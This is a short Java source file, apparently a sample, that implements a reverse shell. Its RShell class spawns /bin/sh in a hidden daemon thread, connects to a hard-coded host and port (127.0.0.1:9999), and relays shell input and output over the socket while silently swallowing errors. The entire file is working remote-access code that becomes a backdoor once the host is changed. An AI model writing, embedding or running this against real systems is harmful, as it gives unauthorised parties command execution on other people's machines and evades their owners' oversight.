package com.Ox08.rshell.sample;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
public class RShell {
    private static final RShell INSTANCE = new RShell();
    private boolean started;
    public static void start() {
        if (INSTANCE.started) {
            return;
        }
        INSTANCE.doStart("127.0.0.1", 9999);
    }
    private synchronized void doStart(final String host, final int port) {
        started = true;
        Thread t = new Thread(() -> {
            Process p = null;
            try {
                final ProcessBuilder pb = new ProcessBuilder("/bin/sh").redirectErrorStream(true);
                p = pb.start();
                try (Socket s = new Socket(host, port);
                     InputStream pi = p.getInputStream();
                     OutputStream po = p.getOutputStream();
                     InputStream si = s.getInputStream();
                     OutputStream so = s.getOutputStream();
                ) {
                    boolean once=true;
                    while (p.isAlive() && !s.isClosed()) {
                        if (once) {
                            once = false;
                            so.write(("Hi from %s\n".formatted(s.getLocalAddress().getHostAddress()))
                                    .getBytes(StandardCharsets.UTF_8));
                        }
                        while (pi.available() > 0) so.write(pi.read());
                        while (si.available() > 0) po.write(si.read());

                        so.flush(); po.flush();

                        synchronized (this) {
                            try {
                                this.wait(100);
                            } catch (InterruptedException ignored) {
                            }
                        }
                    }
                }
            } catch (Exception e) {
               // e.printStackTrace();
            } finally {
                if (p != null) {
                    try {
                        p.destroy();
                    } catch (Exception ignored) {
                    }
                }
            }
        });
        t.setDaemon(true);
        t.start();
    }
}
